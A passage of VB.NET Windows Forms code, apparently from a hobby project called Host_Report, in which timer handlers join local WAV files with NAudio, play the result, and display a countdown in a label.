            "C:\Users\rytho\source\repos\Host_Report\Host_Report\Resources\Blaze.wav", conc)
        Dim sound = New SoundPlayer(
            "C:\Users\rytho\source\repos\Host_Report\Host_Report\Resources\Blaze.wav")
        sound.Play()
        reader.Close()
        reader2.Close()
        fs.Close()
        fs2.Close()


    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Timer2.Stop()

        Dim xt1 = New FileStream(
            "C:\Users\rytho\source\repos\Host_Report\Host_Report\Resources\listen5.wav", FileMode.Open)
        Dim xt2 = New FileStream(
            "C:\Users\rytho\source\repos\Host_Report\Host_Report\Resources\listen6.wav", FileMode.Open)

        Dim xeaderz = New WaveFileReader(xt1)
        Dim xeaderz2 = New WaveFileReader(xt2)
        Dim xamplez1 = xeaderz.ToSampleProvider()
        Dim xamplez2 = xeaderz2.ToSampleProvider()
        Dim xamplez3 = New ISampleProvider() {xamplez1, xamplez2}
        Dim xoncz = New ConcatenatingSampleProvider(xamplez3)
        WaveFileWriter.CreateWaveFile16(
            "C:\Users\rytho\source\repos\Host_Report\Host_Report\Resources\Blast.wav", xoncz)

        Dim soundzx = New SoundPlayer(
            "C:\Users\rytho\source\repos\Host_Report\Host_Report\Resources\Blast.wav")
        soundzx.Play()
        xeaderz.Close()
        xeaderz2.Close()
        xt1.Close()
        xt2.Close()
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Dim ts As TimeSpan = TargetDT.Subtract(DateTime.Now) 'Start of Timer1 Code>>>>
        If ts.TotalMilliseconds > 0 Then
            Label1.Text = ts.ToString("hh\:mm\:ss")
        Else
            Label1.Text = "00:00"
            Timer3.Stop() ' End of Timer1 Code>>>

        End If
    End Sub


End Class
#End Region

